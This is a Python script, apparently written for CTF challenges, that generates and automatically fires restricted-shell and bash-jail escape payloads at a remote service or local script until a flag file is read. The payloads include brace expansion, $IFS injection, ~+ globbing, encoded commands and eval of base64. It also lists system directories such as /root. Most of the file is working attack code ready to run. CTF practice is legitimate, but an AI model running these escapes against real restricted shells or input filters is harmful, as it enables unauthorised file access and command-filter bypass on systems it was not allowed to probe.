#!/usr/bin/env python3
"""auto_shell_escape -- Restricted shell / bash jail escape payload generator.

Enumerates bypass techniques for restricted POSIX shells (rbash, sbash,
pwn.college-style jails, CTF custom filters) and attempts them one at a
time against a live remote service or a local script. Returns the flag
content once any bypass succeeds.

Built from the BYU EOS CTF Skull + Easy challenges where:
  - Skull: sbash blocked `*` glob but not `?`, and `~+` ($PWD) was allowed.
           Payload `~+/???????` globbed to the flag script in $PWD.
  - Easy: bash jail stripped spaces. Payload `{/bin/cat,/app/flag.txt}`
          used brace expansion to inject the separator.

Technique catalog (tried in order, cheapest first):
  1. Direct: `cat /flag.txt` / `cat /app/flag.txt` / common paths
  2. Brace expansion (space bypass): `{cat,/flag}`, `{/bin/cat,/flag}`
  3. IFS injection: `cat${IFS}/flag`, `cat$IFS/flag`, `cat$IFS$9/flag`
  4. `~+` expansion (Bash $PWD): `~+/????????` with varying glob length
  5. Glob wildcards: `/???/c?t /???/fl?g*`, `/*/c?t /*/fl??*`
  6. $'...' ANSI-C quoting: `$'\x63\x61\x74' /flag.txt`
  7. printf octal: `$(printf '\143\141\164 /flag.txt')`
  8. Variable substring: `${PATH:0:1}bin${PATH:0:1}cat${PATH:0:1}flag`
  9. Built-ins only: `read x </flag.txt; echo $x`, `exec < /flag; while read l; do echo $l; done`
 10. $(<file) redirect: `echo "$(</flag.txt)"`
 11. Command substitution via `$()` or backticks
 12. eval base64-encoded payload: `eval $(echo Y2F0IC9mbGFn | base64 -d)`

Usage:
    python3 auto_shell_escape.py --target host:port --flag-format "ctf{"
    python3 auto_shell_escape.py --script /path/to/jail.sh --flag-format "ctf{"
    python3 auto_shell_escape.py --target host:port --flag-format "ctf{" --list-only

Outputs EXTRACTED FLAG: <flag> on success.
"""
from __future__ import annotations

import argparse
import os
import re
import socket
import subprocess
import sys
import time

# Common flag paths, ordered by how often they appear in CTFs.
FLAG_PATHS = [
    "/flag.txt",
    "/flag",
    "/app/flag.txt",
    "/app/flag",
    "/home/ctf/flag.txt",
    "/home/ctf/flag",
    "/root/flag.txt",
    "/srv/flag.txt",
    "/flag.txt.bak",
    "./flag.txt",
    "./flag",
]

# Common absolute binary paths (for when PATH is stripped)
BIN_PATHS = ["/bin/cat", "/usr/bin/cat", "/bin/sh", "/usr/bin/head", "/bin/more"]


def _payloads_for_path(flag_path: str) -> list[tuple[str, str]]:
    """Generate a list of (technique_name, payload) tuples for reading flag_path."""
    out = []
    out.append(("direct-cat", f"cat {flag_path}"))
    out.append(("direct-abs", f"/bin/cat {flag_path}"))
    out.append(("brace-cat", f"{{cat,{flag_path}}}"))
    out.append(("brace-abs", f"{{/bin/cat,{flag_path}}}"))
    out.append(("ifs-braced", "cat${IFS}" + flag_path))
    out.append(("ifs-plain", "cat$IFS" + flag_path))
    out.append(("ifs-9", "cat$IFS$9" + flag_path))
    out.append(("redirect-read", f"read x <{flag_path}; echo $x"))
    out.append(("dollar-less", f'echo "$(<{flag_path})"'))
    out.append(("exec-while", f"exec <{flag_path}; while read l; do echo $l; done"))
    out.append(("ansi-quote", f"$'\\x63\\x61\\x74' {flag_path}"))
    out.append(("printf-octal", f"$(printf '\\143\\141\\164 {flag_path}')"))
    # Glob variations for when the filename is partly known
    out.append(("wildcard-bin-flag", "/???/c?t " + flag_path.replace("flag", "fl?g")))
    out.append(("wildcard-bin", "/*/c?t " + flag_path))
    return out


def _pwd_glob_payloads() -> list[tuple[str, str]]:
    """Payloads for when the flag is a script in $PWD with an unknown filename.

    The Skull-class technique: ~+ expands to $PWD, ?*N chars glob-matches
    any N-char filename. We spray lengths 3..20 to cover typical script names.
    """
    out = []
    for n in range(3, 21):
        q = "?" * n
        out.append((f"pwd-glob-{n}", f"~+/{q}"))
    # Also try with absolute /bin/sh prefix
    for n in range(3, 16):
        q = "?" * n
        out.append((f"abs-glob-{n}", f"/bin/sh ~+/{q}"))
    return out


def _dir_listing_payloads() -> list[tuple[str, str]]:
    """Enumerate interesting directories to find where the flag lives."""
    out = []
    for d in ("/", "/app", "/home", "/root", "/srv", "/tmp", "."):
        out.append((f"ls-{d}", f"{{/bin/ls,-la,{d}}}"))
        out.append((f"ls-plain-{d}", f"/bin/ls -la {d}"))
    return out


def all_payloads() -> list[tuple[str, str]]:
    """Full payload cascade in attempt order."""
    out = []
    for path in FLAG_PATHS:
        out.extend(_payloads_for_path(path))
    out.extend(_pwd_glob_payloads())
    out.extend(_dir_listing_payloads())
    return out


def _extract_flag(response: str, flag_re: re.Pattern) -> str | None:
    m = flag_re.search(response)
    return m.group(0) if m else None


def _send_remote(host: str, port: int, payload: str, timeout: float = 4.0) -> str:
    """Send a single payload to a remote nc-style service and collect output.

    The jail services typically prompt, read a line, execute, then re-prompt.
    We send one payload, sleep briefly, then read all available data.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            # Swallow banner
            time.sleep(0.2)
            try:
                _ = s.recv(8192)
            except socket.timeout:
                pass
            s.sendall(payload.encode() + b"\n")
            time.sleep(0.6)
            collected = b""
            try:
                while True:
                    chunk = s.recv(8192)
                    if not chunk:
                        break
                    collected += chunk
                    if len(collected) > 65536:
                        break
            except socket.timeout:
                pass
            return collected.decode(errors="replace")
    except Exception as e:
        return f"__ERROR__ {e}"


def _send_local(script_path: str, payload: str, timeout: float = 5.0) -> str:
    """Feed payload to a local jail script via stdin."""
    try:
        p = subprocess.run(
            ["bash", script_path],
            input=payload + "\n",
            capture_output=True, text=True,
            timeout=timeout, errors="replace",
        )
        return (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return "__TIMEOUT__"
    except Exception as e:
        return f"__ERROR__ {e}"


def solve(
    target_host: str | None = None,
    target_port: int | None = None,
    script_path: str | None = None,
    flag_format: str = "flag{",
    verbose: bool = False,
) -> dict:
    """Try every payload until a flag is extracted. Returns structured result."""
    brace = flag_format.find("{")
    prefix = flag_format[:brace] if brace >= 0 else flag_format
    if prefix:
        flag_re = re.compile(re.escape(prefix) + r"\{[^}\s]{1,256}\}")
    else:
        flag_re = re.compile(r"[a-zA-Z][a-zA-Z0-9_]{1,12}\{[^}\s]{1,256}\}")

    payloads = all_payloads()
    tried = 0
    for name, payload in payloads:
        tried += 1
        if target_host and target_port:
            resp = _send_remote(target_host, target_port, payload)
        elif script_path:
            resp = _send_local(script_path, payload)
        else:
            return {"flag": None, "error": "no target"}

        if resp.startswith("__ERROR__") or resp.startswith("__TIMEOUT__"):
            if verbose:
                print(f"[{name}] {resp[:80]}", file=sys.stderr)
            continue

        flag = _extract_flag(resp, flag_re)
        if flag:
            return {
                "flag": flag,
                "technique": name,
                "payload": payload,
                "tried": tried,
            }
        if verbose:
            short = resp.replace("\n", " ")[:80]
            print(f"[{name}] {short}", file=sys.stderr)

    return {"flag": None, "tried": tried, "error": "no technique succeeded"}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--target", help="Remote host:port (e.g. chals.example.com:1337)")
    g.add_argument("--script", help="Local jail script path (e.g. /path/to/jail.sh)")
    g.add_argument("--list-only", action="store_true", help="Print the payload catalog and exit")
    ap.add_argument("--flag-format", default="flag{", help="Flag format prefix")
    ap.add_argument("--verbose", action="store_true", help="Print each attempt's response")
    args = ap.parse_args()

    if args.list_only:
        for name, p in all_payloads():
            print(f"{name:18} {p}")
        return 0

    host, port, script = None, None, None
    if args.target:
        if ":" not in args.target:
            print("--target must be host:port", file=sys.stderr)
            return 2
        host, port_s = args.target.rsplit(":", 1)
        port = int(port_s)
    else:
        script = args.script

    result = solve(host, port, script, flag_format=args.flag_format, verbose=args.verbose)
    if result.get("flag"):
        print(f"EXTRACTED FLAG: {result['flag']}")
        print(f"technique: {result['technique']}", file=sys.stderr)
        print(f"payload: {result['payload']}", file=sys.stderr)
        return 0
    print(f"No bypass succeeded after {result.get('tried', 0)} attempts", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
